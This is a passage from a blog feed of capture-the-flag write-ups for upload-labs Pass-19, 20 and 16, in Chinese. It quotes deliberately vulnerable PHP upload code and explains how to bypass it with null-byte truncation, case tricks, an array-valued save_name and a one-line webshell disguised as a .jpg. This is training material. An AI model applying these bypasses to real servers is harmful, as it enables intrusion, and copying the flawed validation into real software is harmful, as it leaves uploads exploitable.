&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }&lt;span style="color:#66d9ef"&gt;else&lt;/span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $msg &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;禁止保存为该类型文件！&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; } &lt;span style="color:#66d9ef"&gt;else&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $msg &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;UPLOAD_PATH&lt;/span&gt; &lt;span style="color:#f92672"&gt;.&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;文件夹不存在,请手工创建！&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;​ 源码第七行使用了&lt;strong&gt;POST&lt;/strong&gt;来接受文件的命名，前面有类似题的是使用了&lt;strong&gt;0x00截断上传&lt;/strong&gt;，后面也同样是&lt;code&gt;move_uploaded_file&lt;/code&gt;移动文件的函数，还使用了黑名单验证，方法就很明确，使用&lt;strong&gt;截断上传&lt;/strong&gt;。别忘了截断上传需要的特定条件：php版本需要低于&lt;code&gt;5.3.29&lt;/code&gt;、&lt;code&gt;magic_quotes_gpc&lt;/code&gt;需要为关闭状态。&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201119164220.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;​ 同样是命名为&lt;code&gt;phpa&lt;/code&gt;方便在十六进制表里修改为&lt;code&gt;00&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201119162729.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;​ 打开图片把url链接&lt;code&gt;http://upload-labs/upload/upload-19.php�&lt;/code&gt;修改一下即可。完工&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201119164458.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;​ 其实这道题还有一个思路，因为题目使用了&lt;strong&gt;黑名单验证&lt;/strong&gt;，分析源码没有设置大小写过滤，所以也可以使用大小写方法通过如&lt;code&gt;Php&lt;/code&gt;，不演示了。&lt;/p&gt;
&lt;h2 id="pass-20"&gt;Pass-20
&lt;/h2&gt;&lt;p&gt;（LInux环境，php7.2.21）&lt;/p&gt;
&lt;p&gt;源码：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$is_upload &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;false&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$msg &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;null&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;if&lt;/span&gt;(&lt;span style="color:#f92672"&gt;!&lt;/span&gt;&lt;span style="color:#66d9ef"&gt;empty&lt;/span&gt;($_FILES[&lt;span style="color:#e6db74"&gt;&amp;#39;upload_file&amp;#39;&lt;/span&gt;])){
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#75715e"&gt;//检查MIME
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;&lt;/span&gt; $allow_type &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;array&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;image/jpeg&amp;#39;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#39;image/png&amp;#39;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#39;image/gif&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt;(&lt;span style="color:#f92672"&gt;!&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;in_array&lt;/span&gt;($_FILES[&lt;span style="color:#e6db74"&gt;&amp;#39;upload_file&amp;#39;&lt;/span&gt;][&lt;span style="color:#e6db74"&gt;&amp;#39;type&amp;#39;&lt;/span&gt;],$allow_type)){
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $msg &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;禁止上传该类型文件!&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }&lt;span style="color:#66d9ef"&gt;else&lt;/span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#75715e"&gt;//检查文件名
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;&lt;/span&gt; $file &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;empty&lt;/span&gt;($_POST[&lt;span style="color:#e6db74"&gt;&amp;#39;save_name&amp;#39;&lt;/span&gt;]) &lt;span style="color:#f92672"&gt;?&lt;/span&gt; $_FILES[&lt;span style="color:#e6db74"&gt;&amp;#39;upload_file&amp;#39;&lt;/span&gt;][&lt;span style="color:#e6db74"&gt;&amp;#39;name&amp;#39;&lt;/span&gt;] &lt;span style="color:#f92672"&gt;:&lt;/span&gt; $_POST[&lt;span style="color:#e6db74"&gt;&amp;#39;save_name&amp;#39;&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (&lt;span style="color:#f92672"&gt;!&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;is_array&lt;/span&gt;($file)) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $file &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;explode&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;.&amp;#39;&lt;/span&gt;, &lt;span style="color:#a6e22e"&gt;strtolower&lt;/span&gt;($file));
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $ext &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;end&lt;/span&gt;($file);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $allow_suffix &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;array&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;jpg&amp;#39;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#39;png&amp;#39;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#39;gif&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (&lt;span style="color:#f92672"&gt;!&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;in_array&lt;/span&gt;($ext, $allow_suffix)) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $msg &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;禁止上传该后缀文件!&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }&lt;span style="color:#66d9ef"&gt;else&lt;/span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $file_name &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;reset&lt;/span&gt;($file) &lt;span style="color:#f92672"&gt;.&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;.&amp;#39;&lt;/span&gt; &lt;span style="color:#f92672"&gt;.&lt;/span&gt; $file[&lt;span style="color:#a6e22e"&gt;count&lt;/span&gt;($file) &lt;span style="color:#f92672"&gt;-&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $temp_file &lt;span style="color:#f92672"&gt;=&lt;/span&gt; $_FILES[&lt;span style="color:#e6db74"&gt;&amp;#39;upload_file&amp;#39;&lt;/span&gt;][&lt;span style="color:#e6db74"&gt;&amp;#39;tmp_name&amp;#39;&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $img_path &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;UPLOAD_PATH&lt;/span&gt; &lt;span style="color:#f92672"&gt;.&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;/&amp;#39;&lt;/span&gt; &lt;span style="color:#f92672"&gt;.&lt;/span&gt;$file_name;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (&lt;span style="color:#a6e22e"&gt;move_uploaded_file&lt;/span&gt;($temp_file, $img_path)) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $msg &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;文件上传成功！&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $is_upload &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;true&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; } &lt;span style="color:#66d9ef"&gt;else&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $msg &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;文件上传失败！&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}&lt;span style="color:#66d9ef"&gt;else&lt;/span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $msg &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;请选择要上传的文件！&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;​ 这道题使用了&lt;code&gt;MIME&lt;/code&gt;验证和白名单验证。先看第10行使用了&lt;code&gt;三目运算符&lt;/code&gt;判断&lt;code&gt;$_POST['save_name']&lt;/code&gt;是否为空，若为空则执行&lt;code&gt;:&lt;/code&gt;前获取上传文件的名称，若不为空则获取POST中的&lt;code&gt;save_name&lt;/code&gt;。第11行使用了&lt;code&gt;is_array&lt;/code&gt;函数判断是否是一个数组，然后使用&lt;code&gt;explode&lt;/code&gt;截断文件名转换小写并返回数组。也就是说，如果我们POST中的&lt;code&gt;save_name&lt;/code&gt;是个数组的就可以跳过11行的判断。15行使用&lt;code&gt;end&lt;/code&gt;函数获取数组中的最后一个元素用于后缀验证。20行把文件名进行拼接：数组&lt;strong&gt;第一个&lt;/strong&gt;元素+数组元素&lt;strong&gt;总数-1&lt;/strong&gt;的那个元素。&lt;/p&gt;
&lt;p&gt;所以我们可以构造一个这样的数组用于绕过：&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201119170734.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;​ 数组[2]用于绕过白名单，文件名为：&lt;code&gt;数组[0].数组[1]&lt;/code&gt;，但是数组[1]是空的所以只剩下&lt;code&gt;数组[0].&lt;/code&gt;（后面有个点）&lt;/p&gt;
&lt;p&gt;​ 别忘了还要绕过&lt;strong&gt;MIME&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201119172340.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201119172415.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;完工&lt;/p&gt;
&lt;h2 id="最后"&gt;最后
&lt;/h2&gt;&lt;p&gt;​ Upload labs的20道题大部分完成了，有两道题没完成，但是也学到了不少东西，这些天再抽空写一个总结吧。射射观看。&lt;/p&gt;</description></item><item><title>Upload-Labs之Pass-16</title><link>https://www.braindance.top/posts/ctf/upload-labs4/</link><pubDate>Mon, 16 Nov 2020 22:50:25 +0000</pubDate><guid>https://www.braindance.top/posts/ctf/upload-labs4/</guid><description>&lt;h2 id="前言"&gt;前言
&lt;/h2&gt;&lt;p&gt;​ 我在这道题上花了快一天的时间，但是也学到了不少姿势，觉得东西应该足够多，而且参考了的博客发现这道题算是有歧义的，不知道作者想要考察的点是哪一个，所以算是有两种解法吧，可惜的是两种方法都不算是大成功，只有部分成功执行了。&lt;/p&gt;
&lt;p&gt;​ 参考博客：&lt;a class="link" href="https://xz.aliyun.com/t/2657#toc-4" target="_blank" rel="noopener"
&gt;upload-labs之pass 16详细分析&lt;/a&gt;&lt;/p&gt;
&lt;h2 id="pass-16"&gt;Pass-16
&lt;/h2&gt;&lt;p&gt;​ 源码（三种图片的判定，只贴一个吧，篇幅小一点）：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$is_upload &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;false&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$msg &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;null&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (&lt;span style="color:#a6e22e"&gt;isset&lt;/span&gt;($_POST[&lt;span style="color:#e6db74"&gt;&amp;#39;submit&amp;#39;&lt;/span&gt;])){
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#75715e"&gt;// 获得上传文件的基本信息，文件名，类型，大小，临时文件路径
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;&lt;/span&gt; $filename &lt;span style="color:#f92672"&gt;=&lt;/span&gt; $_FILES[&lt;span style="color:#e6db74"&gt;&amp;#39;upload_file&amp;#39;&lt;/span&gt;][&lt;span style="color:#e6db74"&gt;&amp;#39;name&amp;#39;&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $filetype &lt;span style="color:#f92672"&gt;=&lt;/span&gt; $_FILES[&lt;span style="color:#e6db74"&gt;&amp;#39;upload_file&amp;#39;&lt;/span&gt;][&lt;span style="color:#e6db74"&gt;&amp;#39;type&amp;#39;&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $tmpname &lt;span style="color:#f92672"&gt;=&lt;/span&gt; $_FILES[&lt;span style="color:#e6db74"&gt;&amp;#39;upload_file&amp;#39;&lt;/span&gt;][&lt;span style="color:#e6db74"&gt;&amp;#39;tmp_name&amp;#39;&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $target_path&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;UPLOAD_PATH&lt;/span&gt;&lt;span style="color:#f92672"&gt;.&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#39;/&amp;#39;&lt;/span&gt;&lt;span style="color:#f92672"&gt;.&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;basename&lt;/span&gt;($filename);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#75715e"&gt;// 获得上传文件的扩展名
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;&lt;/span&gt; $fileext&lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;substr&lt;/span&gt;(&lt;span style="color:#a6e22e"&gt;strrchr&lt;/span&gt;($filename,&lt;span style="color:#e6db74"&gt;&amp;#34;.&amp;#34;&lt;/span&gt;),&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#75715e"&gt;//判断文件后缀与类型，合法才进行上传操作
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt;(($fileext &lt;span style="color:#f92672"&gt;==&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;jpg&amp;#34;&lt;/span&gt;) &lt;span style="color:#f92672"&gt;&amp;amp;&amp;amp;&lt;/span&gt; ($filetype&lt;span style="color:#f92672"&gt;==&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;image/jpeg&amp;#34;&lt;/span&gt;)){
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt;(&lt;span style="color:#a6e22e"&gt;move_uploaded_file&lt;/span&gt;($tmpname,$target_path)){
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#75715e"&gt;//使用上传的图片生成新的图片
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;&lt;/span&gt; $im &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;imagecreatefromjpeg&lt;/span&gt;($target_path);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt;($im &lt;span style="color:#f92672"&gt;==&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;false&lt;/span&gt;){
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $msg &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;该文件不是jpg格式的图片！&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;@&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;unlink&lt;/span&gt;($target_path);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }&lt;span style="color:#66d9ef"&gt;else&lt;/span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#75715e"&gt;//给新图片指定文件名
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;srand&lt;/span&gt;(&lt;span style="color:#a6e22e"&gt;time&lt;/span&gt;());
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $newfilename &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;strval&lt;/span&gt;(&lt;span style="color:#a6e22e"&gt;rand&lt;/span&gt;())&lt;span style="color:#f92672"&gt;.&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;.jpg&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#75715e"&gt;//显示二次渲染后的图片（使用用户上传图片生成的新图片）
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;&lt;/span&gt; $img_path &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;UPLOAD_PATH&lt;/span&gt;&lt;span style="color:#f92672"&gt;.&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#39;/&amp;#39;&lt;/span&gt;&lt;span style="color:#f92672"&gt;.&lt;/span&gt;$newfilename;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;imagejpeg&lt;/span&gt;($im,$img_path);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;@&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;unlink&lt;/span&gt;($target_path);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $is_upload &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;true&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; } &lt;span style="color:#66d9ef"&gt;else&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $msg &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;上传出错！&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }&lt;span style="color:#66d9ef"&gt;else&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt;(($fileext &lt;span style="color:#f92672"&gt;==&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;png&amp;#34;&lt;/span&gt;) &lt;span style="color:#f92672"&gt;&amp;amp;&amp;amp;&lt;/span&gt; ($filetype&lt;span style="color:#f92672"&gt;==&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;image/png&amp;#34;&lt;/span&gt;)){
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;......&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }&lt;span style="color:#66d9ef"&gt;else&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt;(($fileext &lt;span style="color:#f92672"&gt;==&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;gif&amp;#34;&lt;/span&gt;) &lt;span style="color:#f92672"&gt;&amp;amp;&amp;amp;&lt;/span&gt; ($filetype&lt;span style="color:#f92672"&gt;==&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;image/gif&amp;#34;&lt;/span&gt;)){
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;.....&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }&lt;span style="color:#66d9ef"&gt;else&lt;/span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $msg &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;只允许上传后缀为.jpg|.png|.gif的图片文件！&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;​ 提示：&lt;code&gt;本pass重新渲染了图片！&lt;/code&gt;。说明对图片进行了二次渲染，我的理解就是把上传的图片，根据一些标准，只把图片中的图片信息提取出来，再生成一个图片，可以有效避免图片马。&lt;/p&gt;
&lt;p&gt;​ 首先是分析一波源码：&lt;/p&gt;
&lt;p&gt;​ 以jpg文件判定为例。获取文件名、类型、临时文件路径，获取文件后缀，进入jpg图片判定，判定的方式是通过文件后缀和文件的类型判定，再执行&lt;code&gt;move_uploaded_file&lt;/code&gt;函数先把文件移动到&lt;code&gt;upload&lt;/code&gt;文件夹，现在文件路径是&lt;code&gt;$target_path&lt;/code&gt;，之后对图片进行二次渲染。&lt;/p&gt;
&lt;p&gt;​ 二次渲染用到了&lt;code&gt;imagecreatefromjpeg&lt;/code&gt;函数，官方解释：由文件或 URL 创建一个新图象，返回一图像标识符，代表了从给定的文件名取得的图像（这时候图像对象还是一个空的）。然后判断是否是一个图片文件，如果不是的话执行&lt;code&gt;unlink&lt;/code&gt;函数删除文件，否则，为新图片随机一个名称，执行&lt;code&gt;imagejpeg&lt;/code&gt;函数把图象输出到新文件&lt;code&gt; $newfilename&lt;/code&gt;。再将之前用户上传的文件&lt;code&gt;$target_path&lt;/code&gt;删除掉。&lt;/p&gt;
&lt;p&gt;​ 根据上面的分析就能得出来两种思路：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;访问二次渲染之前的上传的文件。&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;在图片二次渲染以后图片马未失效。&lt;/strong&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id="第一种方法"&gt;第一种方法
&lt;/h2&gt;&lt;p&gt;​ （Linux环境、php版本7.2.21）&lt;/p&gt;
&lt;p&gt;​ 因为二次渲染那部分&lt;code&gt;if、else&lt;/code&gt;无论如何都会执行&lt;code&gt;unlink&lt;/code&gt;函数删除你的文件，需要在执行&lt;code&gt;imagecreatefromjpeg&lt;/code&gt;时报错才能访问到自己原来上传的文件。&lt;/p&gt;
&lt;h3 id="jpg格式"&gt;jpg格式
&lt;/h3&gt;&lt;h4 id="准备并上传"&gt;准备并上传
&lt;/h4&gt;&lt;p&gt;​ 需要准备只含有一句话木马的文件并命名为.jpg格式。直接上传。&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201116200050.png"
